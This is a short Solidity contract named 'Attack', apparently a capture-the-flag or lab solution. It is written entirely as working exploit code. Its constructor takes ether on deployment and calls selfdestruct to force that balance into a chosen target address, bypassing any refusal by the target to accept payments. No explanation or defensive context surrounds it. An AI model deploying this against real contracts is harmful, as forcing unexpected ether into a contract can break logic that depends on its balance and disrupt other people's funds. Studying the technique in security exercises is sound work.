contract Attack{

    constructor (address payable _v) public payable {
        selfdestruct(_v);
    }
    
}